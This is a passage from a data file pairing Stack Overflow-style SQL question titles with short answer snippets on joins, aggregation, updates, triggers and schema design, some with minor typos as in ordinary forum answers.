FROM orders_products op   
INNER JOIN products p
ON op.products_id = p.products_id 
WHERE p.manufacturers_id = 1 AND 
p.orders_id > 10000 
"
7403,46265,Result of nested SQL statements in WHERE clause,"SELECT b.id, b.name,
       (SELECT p.price FROM pricing as p WHERE p.license = 1 AND p.beat_id = b.id) as price_1,
       (SELECT p.price FROM pricing as p WHERE p.license = 2 AND p.beat_id = b.id) as price_2
FROM beats as b 
WHERE b.added > 0 AND b.active = 1 AND b.deleted = 0 
GROUP BY b.producer 
HAVING price_1 > 0
ORDER BY b.id DESC 
LIMIT 50;
"
29136,64899,MAX statement in SQL query,"Select Contract, product, MAX(endDate) FROM table1 
INNER JOIN table2 ON table1.contract = table2.contract 
group by contract, product
"
39660,75296,How to add check constraint on time with a timestamp?," alter table toy_store ADD CHECK (EXTRACT(HOUR FROM store_opening_time) > 8 || NULL);
"
28488,41605,How do I delete duplicate rows in SQL Server using the OVER clause?,"WITH CTE AS 
(
    SELECT rn = ROW_NUMBER() 
                OVER( 
                  PARTITION BY employeeid, dateofincident, typeid, description 
                  ORDER BY Id ASC), * 
    FROM dbo.TableName
) 
DELETE FROM cte 
WHERE  rn > 1 
"
22841,55813,optimization of mysql select (bad performance),"SELECT *
FROM ((
  SELECT NULL AS post_subject, t1.id_rec, t1.NAME, t1.id_cat, t1.date_of_record
  FROM records AS t1
  INNER JOIN categories AS t3
    ON t1.id_cat = t3.id_cat
      AND t3.private = 0
  ORDER BY date_of_record DESC LIMIT 10)      
  UNION      
  (SELECT post_subject, NULL, NULL, NULL, post_time
  FROM posts
  ORDER BY post_time DESC LIMIT 10)
  ) a
ORDER BY date_of_record DESC LIMIT 10
"
675,62554,Select multiple columns from the same table without tables union,"with Z as (
    select ... from ... -- <<== Put your big query here
)
select a from Z
union
select b from Z
union 
select c from Z
union 
select d from Z
"
26168,28583,How can you handle an IN sub-query with LINQ to SQL?,"var innerQuery = from fb in FoorBar where fb.BarId = 1000 select fb.FooId;
var result = from f in Foo where innerQuery.Contains(f.FooId) select f;"
14373,70520, MongoDB shell's db.stats() in php and python,"
connection = pymongo.Connection(host = ""127.0.0.1"", port = 27017)
db = connection[""test_db""]
test_collection = db[""test_collection""]
db.command(""dbstats"") # prints database stats for ""test_db""
db.command(""collstats"", ""test_collection"") # prints collection-level stats for ""test_collection"" under ""test_db"".  
"
18773,14661,Splitting a string of text from textbox using VB.NET,"Using connection as New SqlConnection(""connection string"")
    connection.Open()

    For Each tag As String In TextBox.Split(CChar("" ""))
        Using command as New SqlCommand(""INSERT INTO UsedTags(Tag) VALUES(@Tag)"", connection)
            command.Parameters.Add(""@Tag"", SqlDbType.varchar).value = tag

            Try
                command.ExecuteNonQuery()
            Catch ex As SqlException
                Debug.WriteLine(ex.ToString())
            End Try
        End Using
    End For
End Using
"
22014,33626,Merge two Table in SQL Server 2008,"when not matched then insert
  (id, name, email_id) 
  values (stage.id, stage.name, stage.email_id)
"
29751,28850,I am trying to do a massive PostgreSQL update and can not figure out the proper way,"UPDATE member_copy
SET locked_date = CURRENT_DATE
   ,notes = COALESCE(notes || ' ', '') || 'CLOSED'
WHERE id IN (17579, 12345, ...); --- 800 IDs
"
30610,32944,SQL Replace Command needed,"UPDATE shop SET product_price = 3.2 WHERE product_country = 'USA';
"
10184,40604,"Nested subquery in Access alias causing ""enter parameter value""","select s.nightid,
       sum(IIF(IsDouble, 1, 0)) as TopTwoMarkedAsDoubles
from Score as s
where s.id in (select top 2 s2.id
               from score as s2
               where s2.nightid = s.nightid
               order by s2.score desc, s2.IsDouble asc, s2.id
              )
group by s.nightid;
"
5304,13222,Query to get a count of items including zero for missing data,"SELECT COUNT(id) as count, time FROM rsvp GROUP BY time
"
4367,49914,Selecting the 2nd row in sql,"SELECT
    ClientUserName, DestHost, count(DestHost) counts  
FROM 
    #ProxyLog_record  
WHERE
    ClientUserName = (    
        ;with cte as 
        (
            select ROW_NUMBER() over (order by ClientUserName) as rn, * 
            from #ProxyLog_count_2
        ) 
        select ClientUserName from cte where rn=2    
    )
GROUP BY 
    ClientUserName, DestHost 
ORDER BY 
    counts DESC
"
12445,16495,Trying to Design an online Student Exercise Database,"DROP TABLE IF EXISTS `class`;

CREATE TABLE `class` (
  `class_id` int(11) NOT NULL AUTO_INCREMENT,
  `class_name` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`class_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;

/*Data for the table `class` */

insert  into `class`(`class_id`,`class_name`) values (1,'A'),(2,'B'),(3,'C');

/*Table structure for table `info` */

DROP TABLE IF EXISTS `info`;

CREATE TABLE `info` (
  `info_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `parent_id` int(11) DEFAULT NULL,
  `class_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`info_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;

/*Data for the table `info` */

insert  into `info`(`info_id`,`user_id`,`parent_id`,`class_id`) values (1,3,2,1);

/*Table structure for table `user` */

DROP TABLE IF EXISTS `user`;

CREATE TABLE `user` (
  `user_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_name` varchar(255) DEFAULT NULL,
  `users_types_id` int(11) DEFAULT NULL,
  `class_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=latin1;

/*Data for the table `user` */

insert  into `user`(`user_id`,`user_name`,`users_types_id`,`class_id`) values (1,'TeacherA',1,1),(2,'Parent',2,0),(3,'StudentA',3,1),(4,'TeacherB',1,2),(5,'TeacherC',1,3);

DROP TABLE IF EXISTS `users_types`;

CREATE TABLE `users_types` (
  `users_types_id` int(11) NOT NULL AUTO_INCREMENT,
  `type` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`users_types_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;

/*Data for the table `users_types` */

insert  into `users_types`(`users_types_id`,`type`) values (1,'Teacher'),(2,'Parent'),(3,'Student');
"
5628,27692,Removing special character SQL,"SELECT regexp_replace(some_column, '[^0-9]*', '') as clean_value
FROM your_table
"
11236,9714,CASE WHEN...INTO - Stored Procedure,"create or replace procedure example as

    variable1 t69.this_thing%type;
    variable2 t69.that_thing%type;

begin
    select (case when whatever = 1 then
                this_thing 
            else
                null 
            end )   
        ,  (case when whatever != 1 then
                that_thing
            else
                null 
            end )   
    into variable1, variable2        
    from t69;
end;
/
"
8827,34325,SQL - Count of Sessions and transactions between session,"-- this counts number of windows per with same number of events
select events_in_window,count(*) windows 
from (
    -- this counts events in each window
    select window ,count(*) events_in_window 
    from (
        -- this rounds all the transactions to windows
        select user_id,from_unixtime(floor(unix_timestamp(trans_time)/10)*10) window
        from table) a 
    group by window) b 
group by events_in_window 
"
15124,51375,Select only if no date are under 60 days from now,"SELECT 
    *
FROM
    users_user u
WHERE NOT EXISTS (
    SELECT 1 FROM  users_usermission um
    WHERE u.id = um.user_id  
      AND um.date_accepted > CURRENT_DATE - interval '60 days'
);
"
28731,4603,The inverse of a between select PSQL,"SELECT * 
FROM projects 
WHERE lastactivity NOT BETWEEN 2015-08-3 AND 2015-09-11;
"
34788,75398,How to get data from other tables with id's,"SELECT
    u.username,
    u.rank
    n.nationality,
    c.city
FROM
    your_table u
INNER JOIN
    nations n
ON
    u.nationality = n.id
INNER JOIN
    cities c
ON
    u.city = c.id
"
472,67685,Simple SQL JOIN Issue,"SELECT A.district__c, b.annual_conference__c 
FROM Contact_UpdateDistricts A 
JOIN Contact B on a.id = b.id 
WHERE A.error NOT LIKE '%success%' 
and CAST(A.district__c AS VARCHAR(18)) <> CAST(b.annual_conference__c AS VARCHAR(18))
"
16135,56516,Oracle SQL - Issue with inserting values into columns and foreign keys,"INSERT INTO Emp_LC(EmpID, fName, sName, lCCode, Date)
    SELECT EmpId, fName, sName, lCCode, date
    FROM (SELECT EmpID, fName, sName
          FROM Employees
          WHERE jobDesc = 'Driver' OR Employees.JOBDESCRIPTION = 'DRIVER'
         ) CROSS JOIN 
         (SELECT lCCode, date
          FROM LicCerts
          WHERE Desc = 'Driving Licence'
         );
"
22972,7303,Count number of records with same column,"select  did
,       count(*) over (partition by did)
from    YourTable
"
9931,49780,MySQL: Update a column if value is numeric only,"WHERE ColumnA REGEXP '[0-9]+'
"
22058,57197,How to filter rows on nested values in a json column?,"SELECT t.*
FROM   things t, json_each(t.blueprint) b
WHERE  b.value->>'name' ILIKE 'azamund';
"
24833,55980,Query for most frequent value or neither,"WITH
RECOUNTS AS
(    
  SELECT
    NVL(COUNT(CASE TYPE WHEN 0 THEN TYPE END), 0) AS HEROES,
    NVL(COUNT(CASE TYPE WHEN 1 THEN TYPE END), 0) AS VILLAINS
  FROM MUTANTS
)
SELECT
  CASE WHEN HEROES > VILLAINS THEN 'heroes'
       WHEN HEROES < VILLAINS THEN 'villains'
       ELSE 'neither'
  END AS MOSTFREQUENT
FROM RECOUNTS
"
1553,71511,SQL Azure database design issue,"
DECLARE @CategoryID BIGINT = 23
SELECT s.SubCategoryID, s.CategoryID, s.Name 
FROM SubCategories s 
WHERE s.CategoryID = @CategoryID
"
39344,71498,"Is there a command in PostgreSQL that can find if a tuple ""contains"" a specific value?","SELECT * FROM tab where col1 LIKE '%help%' OR col2 LIKE '%hello%'
"
10225,60426,MySQL ORDER BY + LIMIT + OFFSET statements: how to OFFSET firts and only then sort with ORDER BY,"SELECT * FROM (
  SELECT id, name, price, date FROM mytable LIMIT 30 OFFSET _offset_
) AS page ORDER BY page.name asc
"
35722,7080,Change of original column leads to TEXT format in Excel sheet,"strSQL = ""SELECT cast(col# as numeric(10, 2)) col# "" _
         ""FROM OPENQUERY(dtb, 'SELECT sum(col) col# from table')""
"
14159,58034,Sql summarize different rows,"SELECT player_id, SUM(result)
FROM
(SELECT player_a_id AS player_id, player_a_result AS result FROM games
UNION
SELECT player_b_id, player_b_result FROM games) AS u
GROUP BY player_id
ORDER BY player_id
"
18908,19579,SQL Filter Null Columns,"select <column list::filter(where all rows are NULL)>
"
36104,3425,Match where value is NULL in SPARQL,"select ?label ?img where {
?uri rdfs:label ?label.
 OPTIONAL { ?uri vtio:hasImage ?img. }
}
"
10429,64651,Properly Joining Tables in SQL,"SELECT
    ST1.Longitude as StartLong,
    ST1.Latitude as StartLat,
    ST2.Longitude as EndLong,
    ST2.Latitude as EndLat,
    l.ID as LinkID
FROM
   Links l
      inner join
   StationTabs ST1
      on
          l.StationStart = ST1.StationId
      inner join
   StationTabs ST2
      on
          l.StationEnd = ST2.StationId
"
13582,54928,"Learning ExecuteSQL in FMP12, a few questions","ExecuteSQL (""

SELECT M::MovieName FROM Movies M INNER JOIN Genres G ON
M::GenreId=G::GenreId

WHERE M::Rating =

(SELECT MAX(M2::Rating) FROM Movies M2 WHERE M2::GenreId = M::GenreId)

""; """" ; """")
"
25553,57996,Summing values from 3 tables,"DECLARE @Table1 TABLE(
    	UserID INT
)

DECLARE @Table2 TABLE(
    	UserID INT
)

DECLARE @Table3 TABLE(
    	UserID INT
)

INSERT INTO @Table1 (UserID) SELECT 1
INSERT INTO @Table1 (UserID) SELECT 2
INSERT INTO @Table1 (UserID) SELECT 3

INSERT INTO @Table2 (UserID) SELECT 2
INSERT INTO @Table2 (UserID) SELECT 3

INSERT INTO @Table3 (UserID) SELECT 3

SELECT  ISNULL(CountTable1.CountUserIDTable1,0) +
    	ISNULL(CountTable2.CountUserIDTable2,0) +
    	ISNULL(CountTable3.CountUserIDTable3,0) CountOverTables,
    	UserIDs.UserID
FROM    (
    		SELECT	DISTINCT
    				UserID
    		FROM	@Table1
    		UNION	
    		SELECT	DISTINCT
    				UserID
    		FROM	@Table2
    		UNION	
    		SELECT	DISTINCT
    				UserID
    		FROM	@Table3
    	) UserIDs LEFT JOIN
    	(
    		SELECT	UserID,
    				COUNT(UserID) CountUserIDTable1
    		FROM	@Table1
    		GROUP BY UserID
    	) CountTable1 ON UserIDs.UserID = CountTable1.UserID LEFT JOIN
    	(
    		SELECT	UserID,
    				COUNT(UserID) CountUserIDTable2
    		FROM	@Table2
    		GROUP BY UserID
    	) CountTable2 ON UserIDs.UserID = CountTable2.UserID LEFT JOIN
    	(
    		SELECT	UserID,
    				COUNT(UserID) CountUserIDTable3
    		FROM	@Table3
    		GROUP BY UserID
    	) CountTable3 ON UserIDs.UserID = CountTable3.UserID
"
16838,9652,Double search values in the same field,"SELECT *, case when id_dev = 1
               then 'developer'
               when id_dev = 2
               then 'publisher'
          end 
FROM developers 
WHERE id_dev in (1,2)
"
30806,68843,EclipseLink Generates Duplicate Primary Keys,"@SequenceGenerator(name=""TIME_DIM_SEQ"",sequenceName=""TIME_DIM_SEQ"",allocationSi‌​ze=1)
"
39925,39467,MySQL JOIN / IN performance optimization,"SELECT  p.post_id, p.date_created, p.description, p.last_edited,
        p.link, p.link_description, p.link_image_url, p.link_title,
        p.total_comments, p.total_votes, p.type_id, p.user_id
    FROM  posts p
    JOIN  
      ( SELECT  DISTINCT  post_id
            FROM  posts_to_tribes
            WHERE  tribe_id IN (1, 2, 3, 4, 5)
      ) AS ptt USING (post_id)
    ORDER BY  p.last_edited DESC,
              p.total_votes DESC
    LIMIT  25
"
28759,54780,Insert from table1 to table2 on insert trigger,"CREATE TRIGGER Lab_Employee_Time_Off_InsertAction
ON [rps_lab_dev].[dbo].[Lab_Employee_Time_Off]

FOR INSERT

AS


INSERT INTO [dbo].[Lab_Employee_Time_Off_Detail] (Col01, Col02, Col03)
SELECT Col1, Col2, Col3
FROM Inserted

GO
"
16595,37222,Cross join behaviour (SQLServer 2008),"select sched.id, max(txn.dttm), acc.id
from PaymentSchedulePeriod sched 
,(PaymentSchedulePayment pay
right outer join AccountTransaction txn on pay.accountTransactionFk=txn.id 
right outer join Account acc on txn.accountFk=acc.id)
where sched.accountFk=acc.id 
group by sched.id, acc.id
"
25755,53799,How to identify a character position that may be either letters or underscore,"DECLARE @Str nvarchar(50) = N'""§$""!This is your text or column or whatever';
DECLARE @AllowStart nvarchar(100) = N'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ[]_'; -- All characters which are allowed at the beginning
DECLARE @Index int = 1;
WHILE @Index <= LEN(@Str)
BEGIN
    IF CHARINDEX(SUBSTRING(@Str, @Index, 1), @AllowStart) > 0 -- Test if character at position @Index is part of @AllowStart
        BREAK;

    SET @Index += 1;
END

SET @Str = SUBSTRING(@Str, @Index, 100);
"
32557,60397,SQL count items outside of group by filter,"SELECT DISTINCT [Product A], [Product B], 
    COUNT(*) OVER (PARTITION BY [Product A], [Product B]) ComboCount, 
    COUNT(*) OVER (PARTITION BY [Product A]) [Product A Count], 
    COUNT(*) OVER (PARTITION BY [Product B]) [Product B Count]
FROM [ProductCombinations]
ORDER BY ComboCount DESC
"
28365,67468,"Hierarchic data with string paths - query for a node, get all parents and first level of their nodes","SELECT name, id, depth, terminal
FROM ""tree-data""
WHERE 'A/A0/A0.0' LIKE regexp_replace(id, '/[^/]+$', '') || '%'
ORDER BY id;
"
14874,45751,max() issue in Oracle SQL,"select id, type, price, quantity
from
(
select yourtable.*,
    row_number() over (partition by type order by id desc) rn
from yourtable
) v
where rn = 1
"
23897,16850,sql rows containing column twice (or more),"select f.room
from facilities f
where f.facility in ('Computer', 'DVD Player')
group by f.room
having count(distinct f.facility) = 2;
"
19306,68592,Is there any other logical or more robust way,"SELECT  COUNT(CASE WHEN salary >= 0 and salary <= 1000 THEN salary END) ""salary >= 0 and salary <= 1000"",
        COUNT(CASE WHEN salary >= 1000 and salary <= 10000 THEN salary END) ""salary >= 1000 and salary <= 10000"",
        COUNT(CASE WHEN salary >= 10000 and salary <= 100000 THEN salary END) ""salary >= 10000 and salary <= 100000""
from    user_details
"
10920,35903,Handle dynamic values on Oracle Apex from PLSQL,"APEX_COLLECTION.CREATE_COLLECTION(
p_collection_name IN VARCHAR2);

--and to add a value

Begin
APEX_COLLECTION.ADD_MEMBERS(
    p_collection_name => 'EMPLOYEE',
    p_c001 => l_arr1,
    p_c002 => 1_arr2);
End;
"
23081,1939,Regexp_substr to parse a string into pieces,"WITH 
  gen AS ( 
    select 'A123-700' x from dual
    UNION ALL
    select 'A123-700 / WORD-8' x from dual
    union all
    select 'A123 / A456' x from dual
    union all
    select 'WORD-8 / A456-800' x from dual
  ),
  t_slash as (
    SELECT x ,
      nullif(regexp_replace(x, '\s*/.*$'),'WORD-8') as first_slash,
      nullif(regexp_replace(x, '^[^/]*/?\s*'),'WORD-8') as second_slash
    FROM gen
  )
select x, first_slash, 
  regexp_substr(first_slash, '^[^-]*') as first_type,
  regexp_replace(first_slash, '^[^-]*-?') as first_series,
  second_slash,
  regexp_substr(second_slash, '^[^-]*') as second_type,
  regexp_replace(second_slash, '^[^-]*-?') as second_series
from t_slash
"
21469,67922,"SQL Extract list where instances fall outside multiple, varying date windows","SELECT Member, [Service Date], [Order Number]
FROM [transaction table] as tt
WHERE NOT EXISTS(
    SELECT * 
    FROM [eligibility table] as et 
    WHERE tt.Member=et.Member and tt.[Service Date] BETWEEN et.[Elig Begin] and et.[Elig End])
"
36017,52661,password and mobile types in database,"CREATE TABLE `Customer` (
 `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
 `Username` varchar(255) NOT NULL DEFAULT '',
 `Password` varchar(255) NOT NULL DEFAULT '',
 `LastName` varchar(255) NOT NULL DEFAULT '',
 `PhoneNumber` varchar(100) DEFAULT NULL,
 `MobileNumber` varchar(100) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
"
18242,14172,Android SQLite Where not found,"if (dataCursor!=null)
   {
      if(dataCursor.getCount()!=0){
             dataCursor.moveToNext();
       }
      else {
         dataCursor = mDb.rawQuery
        (""SELECT * FROM Smartphone WHERE Model = 'NotListed'"",null);
        dataCursor.moveToNext();
       }
  }
"
6192,7020,Revise schema to fourth normal form,"  SCHEDULE_DATE_MOVIE
  -id_movie  
  -id_room   *
  -date      *

  SCHEDULE_HOUR
  -hour
  -id_room   *
"
31628,11543,"In Oracle SQL, how can I display a blank row between every unique row?","WITH e AS (
      SELECT employee, ITEM_TYPE, COUNT(ITEM_TYPE) as cnt
      FROM hr_database
      GROUP BY employee, ITEM_TYPE
     )
SELECT (case when cnt is not null then employee end) as employee,
       item_type, cnt
FROM (select employee, item_type, cnt, 1 as x from e union all
      select distinct employee, NULL, NULL, 2 as x from e
     ) e
ORDER BY e.employee, x;
"
18001,34210,LINQ join 2 lists,"var tagIDs = new List<int> { 1, 2 };
var products = Products.Where(x => x.TagProducts.Any(y => tagIDs.Contains(y.TagID )));
//to get info from the products, . into them
var tagNames = products.TagProducts.Select(x => x.Tags.TagName); //or whatever.
"
37626,63534,Count 2 columns for occurrence,"SELECT 
    p.name, 
    count(distinct pk1.id) as kills, 
    count(distinct pk2.id) as deaths
FROM player p
LEFT JOIN player_kill pk1 ON pk1.killer = p.id 
LEFT JOIN player_kill pk2 ON pk2.victim = p.id 
group by p.name
"
29113,43423,"how to deal withenddate null value when you do DATEADD(dd,1, s.endDate))","Select* form s where AND (GETDATE() >= s.startDate AND 
GETDATE() <=  DATEADD(dd,1, COALESCE(s.endDate,s.startDate))
"
2759,10641,"Sub Query - Return NULL, if it does not match the highest","declare @name varchar(50)

select @name = name
from   (
       select  row_number() over (order by CBALANCE desc) rn
       ,       name
       from    acct_mstr
       ) as SubQueryAlias
where  rn = 15

-- Return a rowset of one row, even if no row matched
-- the where clause above
select  @name as name
"
230,16309,How to Trace Procedure execution time?,"/* Start of your procedure */
Declare @startTime datetime = GETDATE()
Declare @duration varchar

/* Your procedure */
...

/* End of your procedure */
Set @duration = CONVERT(VARCHAR(8),GETDATE() - @startTime,108)
Insert into statisticTable 
Values ('procedureName', @duration)
"
12681,63433,Multiple conditions on joining tables,"UPDATE  st
SET     st.GLAccount = gt.GLAccount
FROM    StockTransactions st
        INNER JOIN GLTransactions gt ON ( gt.TransactionID = st.PurchaseTransactionID
                                          AND gt.Quantity IS NOT NULL
                                          AND st.Item = gt.Item
                                        )
                                        OR ( gt.TransactionID = st.ID
                                             AND st.Item = gt.Item
                                             AND ( ( st.Type = 160
                                                     OR st.Type = 165
                                                   )
                                                   OR gt.LineType = 1
                                                 )
                                           )
"
21426,24033,PostgreSQL query to detect overlapping time ranges,"select f1.*
from my_features f1
where exists (select 1
              from my_features f2
              where tsrange(f2.begin_time, f2.end_time, '[]') && tsrange(f1.begin_time, f1.end_time, '[]')
                and f2.feature_id = f1.feature_id
                and f2.id <> f1.id);
"
35679,4185,Select TOP x records and return count,"select sum(impact)
from (select top 18 id, obsDate, impact
      from diseaseHits
      where diseaseID = 2 AND pCode = 3352 AND obsDate <= '2014/11/5 11:30:00 PM'
     ) t;
"
19024,3580,Copy the result of a query to a table in PostgreSQL inside function,"INSERT INTO token_relation
  SELECT *
    FROM textblockhastoken  
    ORDER BY textblockid, sentence, position 
    LIMIT  500;
"
2061,69244,SQL duplicate persons multiple tables?,"select p.id, p.firstName, p.lastName, I.DoB, count(*)
from persons as p
join personsInfo as I
on p.ID = i.PersonsID
group by p.firstname, p.lastName, I.DoB
having count(*) > 1
"
11837,7499,How to Update value and ADD UP the previous value,"UPDATE YourTable
SET YourColumn = YourColumn+15
"
36563,58604,How to create list as a parameter in SSRS?,"=SWITCH(Fields!ZipCode >= 11111 and Fields!ZipCode <= 66666, ""Boondock"", Fields!ZipCode >= 77777 and Fields!ZipCode <= 99999, ""Timbuck"",True, ""Everywhere Else"")
"
426,55181,How to using sql query row data and parent-path string?,"SELECT
    t1.id, t1.parentId, t1.name,
  CONCAT ( DECODE (t5.name, NULL, '',  CONCAT(t5.name, '->')),
  CONCAT ( DECODE (t4.name, NULL, '',  CONCAT(t4.name, '->')),
  CONCAT ( DECODE (t3.name, NULL, '',  CONCAT(t3.name, '->')),
  CONCAT ( DECODE (t2.name, NULL, '',  CONCAT(t2.name, '->')),
   T1.NAME   ) )))   
   AS parent_path

FROM
test t1
LEFT JOIN test t2 ON t2.id = t1.parentId
LEFT JOIN test t3 ON t3.id = t2.parentId
LEFT JOIN test t4 ON t4.id = t3.parentId
LEFT JOIN test t5 ON t5.id = t4.parentId
ORDER BY ID
"
11210,48010,Subqueries in multiple WHERE statements in SQL,"select distinct
    place.id,
    user_id
from
    event
    inner join place on
        event.latitude between
            place.latitude - event.radius
            and place.latitude + event.radius
        and event.latitude between
            place.longitude - event.radius
            and place.longitude + event.radius;
"
5928,22680,How to join to a table using aliases,"SELECT Name, PostCode, A.RowIdx AS RowIdx 
FROM
    (SELECT Val AS Name, RowIdx FROM myTable WHERE ColumnID=1) A
    INNER JOIN
    (SELECT Val AS PostCode, RowIdx FROM myTable WHERE ColumnID=2) B
ON A.RowIdx = B.RowIdx;
"
21112,62705,How to get the result set even if the foreign key is null?,"SELECT ...
FROM invoice
JOIN invoicedetails ON invoice.invno = invoicedetails.invnofk
JOIN item ON invoicedetails.itemfkcode = item.itemcode
JOIN payment ON invoice.invno = payment.invfkno
LEFT JOIN customer ON customer.cusid = invoice.cusidfk
WHERE invoicedetails.invnofk = '0000000000005'
"
2256,19185,SQLite query compare distance within rows,"select a.*
from station a
inner join station b
on distance(a.station_id, b.station_id) < 30;
"
7414,75359,Automatically get the value of textbox after selecting value of combobox in vb6,"Private sub CboiPAQ_click()
Set rsiPAQs = New ADODB.Recordset 
With rsiPAQs 
.ActiveConnection = cnMHS 
.CursorLocation = adUseClient 
.CursorType = adOpenStatic 
.LockType = adLockPessimistic 
.Source = ""SELECT location FROM iPAQs WHERE iPAQ="" & ""'"" & CboiPAQ.text & ""'"" 
.Open 
txtbox.text=rsiPAQs(""location"")
End With 
End sub
"
29253,68121,Rectify miss formating of text in mysql column,"UPDATE SomeTable
SET
    VolumeNumber = REPLACE(VolumeNumber, 'Numbers ', ' Numbers ')
WHERE
    VolumeNumber NOT LIKE '% Numbers%'
;
"
7665,42770,Mysql update column based on a string from another table,"Update Workorders
set prebookCB = 1
where CustomerID in (select customerid from customers 
where customeerstatus='Good-Prebook')
"
2010,29092,how to deal with NO DATA FOUND using SYS_REFCURSOR - ORACLE,"     SQL> DECLARE
       2     l_cur   SYS_REFCURSOR;
       3     l_col   VARCHAR2 (10);
       4  BEGIN
       5     OPEN l_cur FOR
       6        SELECT 'Hi there' col
       7          FROM DUAL
       8         WHERE 1 = 0;
       9
      10     DBMS_OUTPUT.put_line ('Opened cursor');
      11
      12     FETCH l_cur INTO l_col;
      13
      14     DBMS_OUTPUT.put_line ('Fetched from cursor');
      15
      16     IF l_cur%NOTFOUND
      17     THEN
      18        DBMS_OUTPUT.put_line ('Oops! No data found. Raising exception...');
      19        RAISE NO_DATA_FOUND;
      20     END IF;
      21
      22     CLOSE l_cur;
      23  EXCEPTION
      24     WHEN NO_DATA_FOUND
      25     THEN
      26        DBMS_OUTPUT.put_line ('Exception raised.');
      27  END;
      28  /
     Opened cursor
     Fetched from cursor
     Oops! No data found. Raising exception...
     Exception raised.

     PL/SQL procedure successfully completed.
"
27233,13815,"How can I ""tell"" MySQL to return the maximum value for each category and some other value associated with that max value?","SELECT C.Id_Continente, P.Nombre, P.Extension,C.Nombre
FROM Pais P RIGHT OUTER JOIN Continente C 
ON C.Id_Continente=P.Continente_FK 
WHERE P.Extension=(SELECT MAX(Extension) FROM Pais P2
                   WHERE P2.Continente_FK = C.Id_Continente)
GROUP BY C.Id_Continente;
"
19630,3394,I'm trying to run a query to get numbers based on the team reponsible for handling these types of issues,"declare @team tinyint
set @team = 4

SELECT CASE
       WHEN Workgroup = 'Group 1' THEN 'Computers'
       WHEN Workgroup = 'Group 2' THEN 'Laptops'
       WHEN Workgroup = 'Group 3' THEN 'Printers'
       WHEN Workgroup = 'Group 4' THEN 'Scanners'
       WHEN Workgroup = 'Group 5' THEN 'Servers'
       WHEN Workgroup = 'Group 6' THEN 'Routers'
       WHEN Workgroup = 'Group 7' THEN 'Switches'
       ELSE 'UNKNOWN Workgroup'
END as Workgroup,
COUNT(*)
FROM MASTERTABLE1
WHERE Status = 'OPEN'
AND ((@team = 1 AND Workgroup IN ('Group 1','Group 2')) OR 
     (@team = 2 AND Workgroup IN ('Group 3','Group 4')) OR
     (@team = 3 AND Workgroup IN ('Group 5')) OR
     (@team = 4 AND Workgroup IN ('Group 6','Group 7')))
GROUP BY Workgroup
"
8823,7876,How do I display the two different records in one single row?,"SELECT x.timestamp start
     , MIN(y.timestamp) end 
  FROM my_table x 
  JOIN my_table y 
    ON y.timestamp > x.timestamp 
   AND y.state = 'end' 
 WHERE x.state = 'start' 
 GROUP 
    BY x.timestamp;
"
38897,69174,Keeping track of web application usage in an SQL Database (Need Suggestions),"select 
  users.id, 
  (users.msg_limit - subq.msgs_used) as msgs_available
from users
inner join (select
              sum(msg_log.cnt) as msgs_used
              from msg_log
              where weekofyear(msg_log.date) = weekofyear(now())
                and msg_log.user = :user_id_param) as subq;
"
20597,44373,Fetch value from another table inside this query,"SELECT r.id, r.name, r.phone, r.email, r.address, r.country, r.adults, r.childs, r.purpose,
       r.booking_type, r.remarks, r.checkin, r.checkout, r.room_id, r.status, r.paid, r.date,
       rooms.number  
FROM reservations r
JOIN rooms ON r.room_id = rooms.id
WHERE DATE_FORMAT(r.date, '%Y-%m') = '$date'
ORDER BY r.id DESC
"
34255,9304,Sorting by Votes,"COALESCE(SUM(vote.vote_value), 0) AS score
"
22158,51730,How do I combine multiple queries?,"select max(most_recent_active), max(most_recent_inactive), key_value, min(status_id)
from (select null as most_recent_active, max(set_date) as most_recent_inactive, key_value,statusid
from status_history
where base_table = 'userinfo'  
and statusid = 10 and set_date > to_date('2012-10-01', 'YYYY-MM-DD')
group by key_value,statusid
    UNION all
select max(set_date) as most_recent_active, null as most_recent_inactive, key_value,statusid
from status_history
where base_table = 'userinfo'  
and statusid = 11
group by key_value,statusid
order by key_value)
group by key_value
"
24786,8560,Underlying rows in Group By,"select original.id
from original
inner join temptable on
   temptable.fieldA = original.fieldA and
   temptable.fieldB = original.fieldB and
   temptable.fieldC = original.fieldC
"
39119,21304,"SQL queries: how to add ""sum"" along with the corresponding data","select 
  p.name,
  p.price,
  op.order_id,
  op.product_id,
  Totals.theSum
from products p
  inner join orders_products op on op.product_id = p.id
  inner join
  (select sum(p.price) as theSum,
    op.order_id
   from products p 
     inner join orders_products op on op.product_id = p.id 
   where op.order_id in (1, 2)
   group by op.order_id) AS Totals
on Totals.order_id = op.order_id;
"
15578,26612,2 left joins with a union,"SELECT CONCAT_WS(' ',i.users_fname, i.users_lname) AS full_name, c.message_text,c.time_sent,c.message_id
FROM tbl_chat AS c
LEFT JOIN tbl_usersinfo AS i ON i.users_id = c.users_id
WHERE (c.users_id = 1 AND c.another_user = 9)
   OR (c.users_id = 9 AND c.another_user = 1)
ORDER BY time_sent ASC
"
14731,62666,Update a variable number of rows each with different values in a single SQL command?,"UPDATE MyTable
SET    Order = (CASE Order WHEN 190 THEN 1
                           ELSE Order + 1
                           END)
WHERE  Order BETWEEN 1 AND 190
"
12521,48850,How to write a SQL command to move all old data from access table into another database/table?,"Option Compare Database
Option Explicit

Sub ArchiveOldRecords()

Dim nSourceCount As Long, nMoveCount As Long, nDestCount As Long
Dim strSQL As String, sMsg As String
Dim rsLock As DAO.Recordset
Dim rsBefore As DAO.Recordset, rsAfter As DAO.Recordset
Dim wrk As Workspace, db As DAO.Database

Const strcTableSource As String = ""t_TestWithDate""  ' Move records FROM table
Const strcTableArch As String = ""t_ArchiveTestWithDate"" ' Move records TO table
Const strcWHERE As String = "" WHERE field2 < "" _
